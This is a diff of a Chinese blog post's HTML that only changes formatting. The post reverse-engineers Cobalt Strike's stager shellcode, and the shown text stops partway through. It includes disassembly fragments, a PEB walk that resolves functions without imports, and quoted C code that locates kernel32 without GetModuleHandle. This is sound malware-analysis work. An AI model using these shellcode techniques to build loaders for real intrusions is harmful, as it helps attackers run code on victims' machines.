@@ -201,16 +201,13 @@
         </header>
 
         <div class="post-content">
-            <h1 id="cobalt-strike-stager-stage-shellcode-深度解析"><a class="markdownIt-Anchor" href="#cobalt-strike-stager-stage-shellcode-深度解析"></a> Cobalt Strike Stager &amp; Stage Shellcode 深度解析</h1>
-<h2 id="一-恶意代码下发"><a class="markdownIt-Anchor" href="#一-恶意代码下发"></a> 一、恶意代码下发</h2>
-<p>我们先来了解CS恶意代码下发以及通信基本流程，其示意图如下图所示：</p>
-<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/CS%E4%B8%8B%E5%8F%91&amp;%E9%80%9A%E4%BF%A1%E6%B5%81%E7%A8%8B.png" alt="CS下发&amp;通信流程"></p>
+            <h1 id="Cobalt-Strike-Stager-amp-Stage-Shellcode-深度解析"><a href="#Cobalt-Strike-Stager-amp-Stage-Shellcode-深度解析" class="headerlink" title="Cobalt Strike Stager &amp; Stage Shellcode 深度解析"></a>Cobalt Strike Stager &amp; Stage Shellcode 深度解析</h1><h2 id="一、恶意代码下发"><a href="#一、恶意代码下发" class="headerlink" title="一、恶意代码下发"></a>一、恶意代码下发</h2><p>我们先来了解CS恶意代码下发以及通信基本流程，其示意图如下图所示：</p>
+<p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/CS下发&amp;通信流程.png" alt="CS下发&amp;通信流程"></p>
 <p>CS在3.x版本较多地使用分（阶）段式恶意代码下发手法——以小巧的shellcode嵌入到可执行文件、注入进程等方式下载较大的、功能较全的Payload。而在4.0版本，CS默认使用Stageless，即不分阶段，将功能完全的Payload直接嵌入可执行文件或者以其他方式执行，官方文章提出这么做是出于安全考虑。</p>
 <p>的确，因为以Stage方式下发，我们能从的Stage中获得很多C&amp;C服务器的信息，以达到溯源、反制的目的。这很大程度要归功于Stager，也就是那段小巧的shellcode并不能带上AES或者RSA等复杂的加密算法，毕竟这会使得shellcode体积变得很大，不利于落地。于是CS选择了以异或的方式对Stage进行了简单的加密，而异或密钥xor_key就包含在下发的Stage中。</p>
-<h2 id="二-stager-shellcode"><a class="markdownIt-Anchor" href="#二-stager-shellcode"></a> 二、Stager Shellcode</h2>
-<h3 id="1-launcher"><a class="markdownIt-Anchor" href="#1-launcher"></a> 1. Launcher</h3>
-<p>上面提到，Stager包含一段简短的Shellcode以下载Stage。我们以stage的方式生成一个可执行文件<code>Artifact.exe</code>。</p>
+<h2 id="二、Stager-Shellcode"><a href="#二、Stager-Shellcode" class="headerlink" title="二、Stager Shellcode"></a>二、Stager Shellcode</h2><h3 id="1-Launcher"><a href="#1-Launcher" class="headerlink" title="1. Launcher"></a>1. Launcher</h3><p>上面提到，Stager包含一段简短的Shellcode以下载Stage。我们以stage的方式生成一个可执行文件<code>Artifact.exe</code>。</p>
 <div style="page-break-after: always;"></div> 
+
 <p>由于可执行文件比较简单，没有玩啥花的，IDA里面可以直接F5。</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021173228832.png" alt="image-20201021173228832"></p>
 <p>函数<code>sub_4027B0()</code>与初始化有关，主要执行了<code>sub_4014F0()</code></p>
@@ -227,198 +224,190 @@
 <p>最后<code>sub_401559()</code>中，将读入堆中的shellcode进行解密并申请虚拟空间，用<code>VirtualProtect()</code>将申请到的空间加入可读和执行权限再创建线程执行：</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174201888.png" alt="image-20201021174201888"></p>
 <div style="page-break-after: always;"></div> 
-<h3 id="2-stager-shellcode"><a class="markdownIt-Anchor" href="#2-stager-shellcode"></a> 2. Stager Shellcode</h3>
-<h4 id="21-start"><a class="markdownIt-Anchor" href="#21-start"></a> 2.1  start</h4>
-<p>xor解密是四字节一组进行解密的，并且只用到了<code>xor_key</code>的前四个字节。</p>
+
+<h3 id="2-Stager-Shellcode"><a href="#2-Stager-Shellcode" class="headerlink" title="2. Stager Shellcode"></a>2. Stager Shellcode</h3><h4 id="2-1-start"><a href="#2-1-start" class="headerlink" title="2.1  start"></a>2.1  start</h4><p>xor解密是四字节一组进行解密的，并且只用到了<code>xor_key</code>的前四个字节。</p>
 <p><img src="/2020/10/22/Cobalt-Strike-Stager&Stage-Shellcode-深度解析/image-20201021174251460.png" alt="image-20201021174251460"></p>
 <p>而解码后的shellcode可以转换为如下的x86汇编代码:</p>
-<pre class="highlight"><code class="x86asm"><span class="number">0x0000</span>:  FC                <span class="keyword">cld</span>    
-<span class="number">0x0001</span>:  E8 <span class="number">89</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    <span class="keyword">call</span>   <span class="number">0x8f</span>  
-<span class="comment">;======================== 寻找函数地址 ==========================</span>
+<pre><code class="lang-x86asm">0x0000:  FC                cld    
+0x0001:  E8 89 00 00 00    call   0x8f  
+;======================== 寻找函数地址 ==========================
 ...
-<span class="comment">; ======================== 核心函数 =============================</span>
-<span class="number">0x008f</span>:  <span class="number">5D</span>                <span class="keyword">pop</span>    <span class="built_in">ebp</span>
-<span class="number">0x0090</span>:  <span class="number">68</span> 6E <span class="number">65</span> <span class="number">74</span> <span class="number">00</span>    <span class="keyword">push</span>   <span class="number">0x74656e</span>   <span class="comment">; "wininet\x00"入栈</span>
-<span class="number">0x0095</span>:  <span class="number">68</span> <span class="number">77</span> <span class="number">69</span> 6E <span class="number">69</span>    <span class="keyword">push</span>   <span class="number">0x696e6977</span>
-<span class="number">0x009a</span>:  <span class="number">54</span>                <span class="keyword">push</span>   <span class="built_in">esp</span>       
-<span class="number">0x009b</span>:  <span class="number">68</span> 4C <span class="number">77</span> <span class="number">26</span> <span class="number">07</span>    <span class="keyword">push</span>   <span class="number">0x726774c</span>
-<span class="number">0x00a0</span>:  FF D5             <span class="keyword">call</span>   <span class="built_in">ebp</span>        <span class="comment">; LoadLibraryA("wininet")</span>
+; ======================== 核心函数 =============================
+0x008f:  5D                pop    ebp
+0x0090:  68 6E 65 74 00    push   0x74656e   ; &quot;wininet\x00&quot;入栈
+0x0095:  68 77 69 6E 69    push   0x696e6977
+0x009a:  54                push   esp       
+0x009b:  68 4C 77 26 07    push   0x726774c
+0x00a0:  FF D5             call   ebp        ; LoadLibraryA(&quot;wininet&quot;)
 </code></pre>
 <p>先<code>cld</code>清理符号位，再用<code>call</code>将寻址函数地址入栈，然后再<code>pop ebp</code>，后续所有的函数都是以<code>call ebp</code>的形式调用，重点关注一下shellcode是如何找到函数地址的。</p>
-<h4 id="22-函数寻址"><a class="markdownIt-Anchor" href="#22-函数寻址"></a> 2.2 函数寻址</h4>
-<pre class="highlight"><code class="x86asm"><span class="comment">;========================= 寻找函数地址 ========================</span>
-<span class="number">0x0006</span>:  <span class="number">60</span>            pushal <span class="comment">;push EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI</span>
-<span class="number">0x0007</span>:  <span class="number">89</span> E5         <span class="keyword">mov</span>    <span class="built_in">ebp</span>, <span class="built_in">esp</span>
-<span class="number">0x0009</span>:  <span class="number">31</span> D2         <span class="keyword">xor</span>    <span class="built_in">edx</span>, <span class="built_in">edx</span>
-<span class="number">0x000b</span>:  <span class="number">64</span> 8B <span class="number">52</span> <span class="number">30</span>   <span class="keyword">mov</span>    <span class="built_in">edx</span>, <span class="built_in">fs</span>:[<span class="built_in">edx</span> + <span class="number">0x30</span>]       <span class="comment">;edx=PEB</span>
-<span class="number">0x000f</span>:  8B <span class="number">52</span> 0C      <span class="keyword">mov</span>    <span class="built_in">edx</span>, [<span class="built_in">edx</span> + <span class="number">0xc</span>]           <span class="comment">;edx=PEB_LDR_DATA</span>
-<span class="number">0x0012</span>:  8B <span class="number">52</span> <span class="number">14</span>      <span class="keyword">mov</span>    <span class="built_in">edx</span>, [<span class="built_in">edx</span> + <span class="number">0x14</span>]          <span class="comment">;edx=InMemoryOrderModuleList</span>
-<span class="number">0x0015</span>:  8B <span class="number">72</span> <span class="number">28</span>      <span class="keyword">mov</span>    <span class="built_in">esi</span>, [<span class="built_in">edx</span> + <span class="number">0x28</span>]          <span class="comment">;???</span>
-<span class="number">0x0018</span>:  0F B7 4A <span class="number">26</span>   <span class="keyword">movzx</span>  <span class="built_in">ecx</span>, <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">edx</span> + <span class="number">0x26</span>] <span class="comment">;???</span>
+<h4 id="2-2-函数寻址"><a href="#2-2-函数寻址" class="headerlink" title="2.2 函数寻址"></a>2.2 函数寻址</h4><pre><code class="lang-x86asm">;========================= 寻找函数地址 ========================
+0x0006:  60            pushal ;push EAX,EBX,ECX,EDX,ESP,EBP,ESI,EDI
+0x0007:  89 E5         mov    ebp, esp
+0x0009:  31 D2         xor    edx, edx
+0x000b:  64 8B 52 30   mov    edx, fs:[edx + 0x30]       ;edx=PEB
+0x000f:  8B 52 0C      mov    edx, [edx + 0xc]           ;edx=PEB_LDR_DATA
+0x0012:  8B 52 14      mov    edx, [edx + 0x14]          ;edx=InMemoryOrderModuleList
+0x0015:  8B 72 28      mov    esi, [edx + 0x28]          ;???
+0x0018:  0F B7 4A 26   movzx  ecx, word ptr [edx + 0x26] ;???
 </code></pre>
 <p>首先用<code>pushal</code>将所有寄存器在栈上存起来备份，再调整栈帧，<code>edx</code>置零。</p>
 <p>寄存器<code>FS</code>在Windows上指向的是TEB线程信息块（Thread Environment Block）。读取TEB可以读取到进、线程以及与系统相关的信息。</p>
 <p><code>TEB</code>结构用x86 windbg输出如下：</p>
-<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _TEB
+<pre><code class="lang-x86asm">&gt; dt _TEB
 ntdll!_TEB
-   +<span class="number">0x000</span> NtTib            : _NT_TIB
-   +<span class="number">0x01c</span> EnvironmentPointer : Ptr32 Void
-   +<span class="number">0x020</span> ClientId         : _CLIENT_ID
-   +<span class="number">0x028</span> ActiveRpcHandle  : Ptr32 Void
-   +<span class="number">0x02c</span> ThreadLocalStoragePointer : Ptr32 Void
-   +<span class="number">0x030</span> ProcessEnvironmentBlock : Ptr32 _PEB      # Fetch
-   +<span class="number">0x034</span> LastErrorValue   : Uint4B
-   +<span class="number">0x038</span> CountOfOwnedCriticalSections : Uint4B
-   +<span class="number">0x03c</span> CsrClientThread  : Ptr32 Void
-   +<span class="number">0x040</span> Win32ThreadInfo  : Ptr32 Void
-   +<span class="number">0x044</span> User32Reserved   : [<span class="number">26</span>] Uint4B
-   +<span class="number">0x0ac</span> UserReserved     : [<span class="number">5</span>] Uint4B
-   +<span class="number">0x0c0</span> WOW32Reserved    : Ptr32 Void
-   +<span class="number">0x0c4</span> CurrentLocale    : Uint4B
-   +<span class="number">0x0c8</span> FpSoftwareStatusRegister : Uint4B
-   +<span class="number">0x0cc</span> SystemReserved1  : [<span class="number">54</span>] Ptr32 Void
-   +<span class="number">0x1a4</span> ExceptionCode    : Int4B
-   +<span class="number">0x1a8</span> ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
+   +0x000 NtTib            : _NT_TIB
+   +0x01c EnvironmentPointer : Ptr32 Void
+   +0x020 ClientId         : _CLIENT_ID
+   +0x028 ActiveRpcHandle  : Ptr32 Void
+   +0x02c ThreadLocalStoragePointer : Ptr32 Void
+   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB      # Fetch
+   +0x034 LastErrorValue   : Uint4B
+   +0x038 CountOfOwnedCriticalSections : Uint4B
+   +0x03c CsrClientThread  : Ptr32 Void
+   +0x040 Win32ThreadInfo  : Ptr32 Void
+   +0x044 User32Reserved   : [26] Uint4B
+   +0x0ac UserReserved     : [5] Uint4B
+   +0x0c0 WOW32Reserved    : Ptr32 Void
+   +0x0c4 CurrentLocale    : Uint4B
+   +0x0c8 FpSoftwareStatusRegister : Uint4B
+   +0x0cc SystemReserved1  : [54] Ptr32 Void
+   +0x1a4 ExceptionCode    : Int4B
+   +0x1a8 ActivationContextStackPointer : Ptr32 _ACTIVATION_CONTEXT_STACK
    ....
 </code></pre>
 <p>故<code>mov edx, fs:[edx + 0x30]</code>是取的PEB的地址（Process Environment Block）。</p>
 <p>而下一条指令<code>mov edx, [edx+0xc]</code>就很明显读取的是<code>Ldr</code>结构。</p>
-<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _PEB
+<pre><code class="lang-x86asm">&gt; dt _PEB
 ntdll!_PEB
-   +<span class="number">0x000</span> InheritedAddressSpace : UChar
-   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar
-   +<span class="number">0x002</span> BeingDebugged    : UChar
-   +<span class="number">0x003</span> BitField         : UChar
-   +<span class="number">0x003</span> ImageUsesLargePages : Pos <span class="number">0</span>, <span class="number">1</span> Bit
-   +<span class="number">0x003</span> IsProtectedProcess : Pos <span class="number">1</span>, <span class="number">1</span> Bit
-   +<span class="number">0x003</span> IsLegacyProcess  : Pos <span class="number">2</span>, <span class="number">1</span> Bit
-   +<span class="number">0x003</span> IsImageDynamicallyRelocated : Pos <span class="number">3</span>, <span class="number">1</span> Bit
-   +<span class="number">0x003</span> SkipPatchingUser32Forwarders : Pos <span class="number">4</span>, <span class="number">1</span> Bit
-   +<span class="number">0x003</span> SpareBits        : Pos <span class="number">5</span>, <span class="number">3</span> <span class="meta">Bits</span>
-   +<span class="number">0x004</span> Mutant           : Ptr32 Void
-   +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void
-   +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA                   # Fetch
-   +<span class="number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
-   +<span class="number">0x014</span> SubSystemData    : Ptr32 Void
-   +<span class="number">0x018</span> ProcessHeap      : Ptr32 Void
-   +<span class="number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
-   +<span class="number">0x020</span> AtlThunkSListPtr : Ptr32 Void
-   +<span class="number">0x024</span> IFEOKey          : Ptr32 Void
-   +<span class="number">0x028</span> CrossProcessFlags : Uint4B
+   +0x000 InheritedAddressSpace : UChar
+   +0x001 ReadImageFileExecOptions : UChar
+   +0x002 BeingDebugged    : UChar
+   +0x003 BitField         : UChar
+   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
+   +0x003 IsProtectedProcess : Pos 1, 1 Bit
+   +0x003 IsLegacyProcess  : Pos 2, 1 Bit
+   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit
+   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit
+   +0x003 SpareBits        : Pos 5, 3 Bits
+   +0x004 Mutant           : Ptr32 Void
+   +0x008 ImageBaseAddress : Ptr32 Void
+   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA                   # Fetch
+   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
+   +0x014 SubSystemData    : Ptr32 Void
+   +0x018 ProcessHeap      : Ptr32 Void
+   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
+   +0x020 AtlThunkSListPtr : Ptr32 Void
+   +0x024 IFEOKey          : Ptr32 Void
+   +0x028 CrossProcessFlags : Uint4B
    ...
 </code></pre>
 <p>其数据结构为<code>_PEB_LDR_DATA</code>：</p>
-<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _PEB_LDR_DATA
+<pre><code class="lang-x86asm">&gt; dt _PEB_LDR_DATA
 ntdll!_PEB_LDR_DATA
-   +<span class="number">0x000</span> Length           : Uint4B
-   +<span class="number">0x004</span> Initialized      : UChar
-   +<span class="number">0x008</span> SsHandle         : Ptr32 Void
-   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY
-   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY           # Fetch
-   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY
-   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void
-   +<span class="number">0x028</span> ShutdownInProgress : UChar
-   +<span class="number">0x02c</span> ShutdownThreadId : Ptr32 Void
+   +0x000 Length           : Uint4B
+   +0x004 Initialized      : UChar
+   +0x008 SsHandle         : Ptr32 Void
+   +0x00c InLoadOrderModuleList : _LIST_ENTRY
+   +0x014 InMemoryOrderModuleList : _LIST_ENTRY           # Fetch
+   +0x01c InInitializationOrderModuleList : _LIST_ENTRY
+   +0x024 EntryInProgress  : Ptr32 Void
+   +0x028 ShutdownInProgress : UChar
+   +0x02c ShutdownThreadId : Ptr32 Void
    ...
 </code></pre>
 <p>于是我们可以看到<code>mov edx, [edx+0x14]</code>读取的是<code>InMemoryOrderModuleList</code>，其数据结构为<code>_LIST_ENTRY</code>，微软文档中将<code>InMemoryOrderModuleList</code>描述为:</p>
 <blockquote>
-<p>The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an <strong>_LDR_DATA_TABLE_ENTRY</strong> structure.</p>
+<p> The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an <strong>_LDR_DATA_TABLE_ENTRY</strong> structure.</p>
 </blockquote>
-<h5 id="221-奇怪的inmemoryordermodulelist指针"><a class="markdownIt-Anchor" href="#221-奇怪的inmemoryordermodulelist指针"></a> 2.2.1 奇怪的<code>InMemoryOrderModuleList</code>指针</h5>
-<p>既然是一个包含<code>_LDR_DATA_TABLE_ENTRY</code> 指针的双链表结构，那么毫无疑问，结构体<code>_LIST_ENTRY</code>将包含首尾两个指针——分别为<code>Flink</code>和<code>Blink</code>：</p>
-<pre class="highlight"><code class="x86asm">&gt; <span class="built_in">dt</span> _LIST_ENTRY
+<h5 id="2-2-1-奇怪的InMemoryOrderModuleList指针"><a href="#2-2-1-奇怪的InMemoryOrderModuleList指针" class="headerlink" title="2.2.1 奇怪的InMemoryOrderModuleList指针"></a>2.2.1 奇怪的<code>InMemoryOrderModuleList</code>指针</h5><p>既然是一个包含<code>_LDR_DATA_TABLE_ENTRY</code> 指针的双链表结构，那么毫无疑问，结构体<code>_LIST_ENTRY</code>将包含首尾两个指针——分别为<code>Flink</code>和<code>Blink</code>：</p>
+<pre><code class="lang-x86asm">&gt; dt _LIST_ENTRY
 ntdll!_LIST_ENTRY
-   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY
-   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRYas
+   +0x000 Flink            : Ptr32 _LIST_ENTRY
+   +0x004 Blink            : Ptr32 _LIST_ENTRYas
 </code></pre>
 <p>由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而指令<code>mov esi, [edx+0x28]</code>却让人摸不着头脑：明明<code>_LIST_ENTRY</code>是一个8字节大小的双链表节点，你不取指针拿到<code>_LDR_DATA_TABLE_ENTRY</code>结构进行下一步操作而是直接拿链表地址<code>edx+0x28</code>赋值给<code>esi</code>，难道文档中的<code>Each item in the list is a pointer to a _LDR_DATA_TABLE_ENTRY structure</code>我们理解错了吗？</p>
 <p>对此笔者进行了搜索，发现了一个国外论坛的帖子，十分有趣地讨论了这一个问题：</p>
 <p><a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/190128-inmemoryordermodulelist-documentation-im-confused.html" target="_blank" rel="noopener">InMemoryOrderModuleList Documentation - I’m confused</a></p>
 <p>原贴如下：</p>
 <hr>
-<p>hey everyone,</p>
-<p>i found a neat little tutorial to grab the base address of kernel32.dll without using GetModuleHandle. <a href="http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/" target="_blank" rel="noopener">http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/</a></p>
-<p>i also found all the necessary structs here <a href="http://undocumented.ntinternals.net/" target="_blank" rel="noopener">http://undocumented.ntinternals.net/</a></p>
-<p>i already successfully implemented this. according to the sources above, the base address is at 0x10 of the third list element. however MSDN documents something else: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx</a></p>
-<p>Quote:</p>
+<p> hey everyone,</p>
+<p> i found a neat little tutorial to grab the base address of kernel32.dll without using GetModuleHandle. <a href="http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/" target="_blank" rel="noopener">http://www.rohitab.com/discuss/topic/38717-quick-tutorial-finding-kernel32-base-and-walking-its-export-table/</a></p>
+<p> i also found all the necessary structs here <a href="http://undocumented.ntinternals.net/" target="_blank" rel="noopener">http://undocumented.ntinternals.net/</a></p>
+<p> i already successfully implemented this. according to the sources above, the base address is at 0x10 of the third list element. however MSDN documents something else: <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/windows/desktop/aa813708(v=vs.85).aspx</a></p>
+<p> Quote: </p>
 <blockquote>
-<p>InMemoryOrderModuleList</p>
-<p>The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure. For more information, see Remarks.</p>
+<p> InMemoryOrderModuleList</p>
+<p>The head of a doubly-linked list that contains the loaded modules for the process. Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure. For more information, see Remarks. </p>
 </blockquote>
-<p>Code:</p>
-<pre class="highlight"><code class="c"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> {</span>
-PVOID Reserved1[<span class="number">2</span>];
-LIST_ENTRY InMemoryOrderLinks;
-PVOID Reserved2[<span class="number">2</span>];
-PVOID DllBase;
-PVOID EntryPoint;
-PVOID Reserved3;
-UNICODE_STRING FullDllName;
-BYTE Reserved4[<span class="number">8</span>];
-PVOID Reserved5[<span class="number">3</span>];
-<span class="keyword">union</span> {
-ULONG CheckSum;
-PVOID Reserved6;
-};
-ULONG TimeDateStamp;
-} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+<p> Code: </p>
+<pre><code class="lang-c"> typedef struct _LDR_DATA_TABLE_ENTRY {
+ PVOID Reserved1[2];
+ LIST_ENTRY InMemoryOrderLinks;
+ PVOID Reserved2[2];
+ PVOID DllBase;
+ PVOID EntryPoint;
+ PVOID Reserved3;
+ UNICODE_STRING FullDllName;
+ BYTE Reserved4[8];
+ PVOID Reserved5[3];
+ union {
+ ULONG CheckSum;
+ PVOID Reserved6;
+ };
+ ULONG TimeDateStamp;
+ } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
 </code></pre>
-<p><strong>according to this, it should be at 0x18 (which isn’t the case. it is at 0x10 for sure, already tested it). am i misunderstanding the sentence “Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure.” or are microsoft just publishing wrong information?</strong><br>
-/e: for reference, this works:<br>
-Code:</p>
-<pre class="highlight"><code class="c">PPEB ppeb   = <span class="keyword">reinterpret_cast</span>&lt;PPEB&gt;(__readfsdword(<span class="number">0x30</span>));m_hKernel32 = *<span class="keyword">reinterpret_cast</span>&lt;HMODULE*&gt;(<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uintptr_t</span>&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink) + <span class="number">0x10</span>);
+<p> <strong>according to this, it should be at 0x18 (which isn’t the case. it is at 0x10 for sure, already tested it). am i misunderstanding the sentence “Each item in the list is a pointer to an LDR_DATA_TABLE_ENTRY structure.” or are microsoft just publishing wrong information?</strong><br> /e: for reference, this works:<br> Code:</p>
+<pre><code class="lang-c">PPEB ppeb   = reinterpret_cast&lt;PPEB&gt;(__readfsdword(0x30));m_hKernel32 = *reinterpret_cast&lt;HMODULE*&gt;(reinterpret_cast&lt;uintptr_t&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink) + 0x10);
 </code></pre>
-<p>and this doesn’t, although it is correct according to MSDN<br>
-Code:</p>
-<pre class="highlight"><code class="c">PPEB ppeb   = <span class="keyword">reinterpret_cast</span>&lt;PPEB&gt;(__readfsdword(<span class="number">0x30</span>));m_hKernel32 = <span class="keyword">reinterpret_cast</span>&lt;HMODULE&gt;(<span class="keyword">reinterpret_cast</span>&lt;PLDR_DATA_TABLE_ENTRY&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink)-&gt;DllBase);
+<p> and this doesn’t, although it is correct according to MSDN<br> Code:</p>
+<pre><code class="lang-c"> PPEB ppeb   = reinterpret_cast&lt;PPEB&gt;(__readfsdword(0x30));m_hKernel32 = reinterpret_cast&lt;HMODULE&gt;(reinterpret_cast&lt;PLDR_DATA_TABLE_ENTRY&gt;(ppeb-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink)-&gt;DllBase);
 </code></pre>
 <hr>
-<p>发帖者声称找到了一种不需要<code>GetModuleHandle</code>函数就能优雅地定位<code>kernal32.dll</code>的方法，并对微软官方文档和偏移误差提出了疑问，同时也怀疑自己是否理解错了官方文档中的那句**“列表中每项都有一个指向LDR_DATA_TABLE_ENTRY 结构的指针”**。</p>
+<p>发帖者声称找到了一种不需要<code>GetModuleHandle</code>函数就能优雅地定位<code>kernal32.dll</code>的方法，并对微软官方文档和偏移误差提出了疑问，同时也怀疑自己是否理解错了官方文档中的那句<strong>“列表中每项都有一个指向LDR_DATA_TABLE_ENTRY 结构的指针”</strong>。</p>
 <p>而回答也十分言简意赅，指出了<code>Flink</code>和<code>Blink</code>是指向<code>LDR_DATA_TABLE_ENTRY</code>结构体中的<code>InMemoryOrderModuleList</code>而非结构体的起始地址，并同时给出了<code>CONTAINING_RECORD</code>宏的用法——给出数据结构与调用的成员，从而找到数据起始的地址。</p>
 <hr>
-<p>Each Flink and Blink are pointers to LDR_DATA_TABLE_ENTRY, like MSDN says. But they don’t point to the start of struct like your last piece of code assumes. They point to the InMemoryOrderModuleList member of the struct.<br>
-To get the start of the LDR_DATA_TABLE_ENTRY from the FLink you have to subtract the InMemoryOrderModuleList field offset. This is what the CONTAINING_RECORD macro is used for.</p>
-<pre class="highlight"><code class="c">PLDR_DATA_TABLE_ENTRY dataEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);
+<p> Each Flink and Blink are pointers to LDR_DATA_TABLE_ENTRY, like MSDN says. But they don’t point to the start of struct like your last piece of code assumes. They point to the InMemoryOrderModuleList member of the struct.<br> To get the start of the LDR_DATA_TABLE_ENTRY from the FLink you have to subtract the InMemoryOrderModuleList field offset. This is what the CONTAINING_RECORD macro is used for.</p>
+<pre><code class="lang-c"> PLDR_DATA_TABLE_ENTRY dataEntry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);
 </code></pre>
-<p>Where listEntry is one of the F/Blinks</p>
+<p> Where listEntry is one of the F/Blinks</p>
 <hr>
 <p>其中<code>CONTAINING_RECORD</code>宏的定义如下：</p>
-<pre class="highlight"><code class="c"><span class="meta">#<span class="meta-keyword">define</span> CONTAINING_RECORD(address,type,field) ((type*)((PCHAR)(address)-(ULONG_PTR)(&amp;((type*)0)-&gt;field)))</span>
+<pre><code class="lang-c">#define CONTAINING_RECORD(address,type,field) ((type*)((PCHAR)(address)-(ULONG_PTR)(&amp;((type*)0)-&gt;field)))
 </code></pre>
 <p>利用强制类型转换将地址0转化为<code>type</code>类型，即传进来的数据结构体类型，然后调用成员取其地址，因为强制类型转化的地址是0，那么调用其成员后的地址即为结构体内成员的偏移地址，故我们得到<code>成员真实地址 - 成员偏移地址=结构体起始地址</code>。</p>
 <p>具体可以参考这两篇文章：</p>
 <p><a href="https://www.cnblogs.com/Crazycatmiao/p/6731477.html" target="_blank" rel="noopener"> [CRAZYC4T] - CONTAINING_RECORD</a></p>
 <p><a href="https://blog.twofei.com/546/" target="_blank" rel="noopener"> [movsb] - 我对CONTAINING_RECORD宏的详细解释</a></p>
-<h5 id="222-奇怪的偏移0x28"><a class="markdownIt-Anchor" href="#222-奇怪的偏移0x28"></a> 2.2.2 奇怪的偏移<code>0x28</code></h5>
-<p>那么我们将目光转回来。既然由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而在<code>_LDR_DATA_TABLE_ENTRY</code>结构体中<code>InMemoryOrderModuleList</code>是偏移为0x08，所以指令<code>mov esi, [edx+0x28]</code>访问的是<code>_LDR_DATA_TABLE_ENTRY+0x08+0x28</code>的地方，即偏移为<code>0x30</code>。</p>
+<h5 id="2-2-2-奇怪的偏移0x28"><a href="#2-2-2-奇怪的偏移0x28" class="headerlink" title="2.2.2 奇怪的偏移0x28"></a>2.2.2 奇怪的偏移<code>0x28</code></h5><p>那么我们将目光转回来。既然由上面的推算我们知道当前<code>edx=InMemoryOrderModuleList</code>，而在<code>_LDR_DATA_TABLE_ENTRY</code>结构体中<code>InMemoryOrderModuleList</code>是偏移为0x08，所以指令<code>mov esi, [edx+0x28]</code>访问的是<code>_LDR_DATA_TABLE_ENTRY+0x08+0x28</code>的地方，即偏移为<code>0x30</code>。</p>
 <p>那么我们用x86 windbg输出<code>_LDR_DATA_TABLE_ENTRY</code>结构体：</p>
-<pre class="highlight"><code class="x86asm"><span class="built_in">dt</span> _LDR_DATA_TABLE_ENTRY
+<pre><code class="lang-x86asm">dt _LDR_DATA_TABLE_ENTRY
 ntdll!_LDR_DATA_TABLE_ENTRY
-   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY
-   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY
-   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY
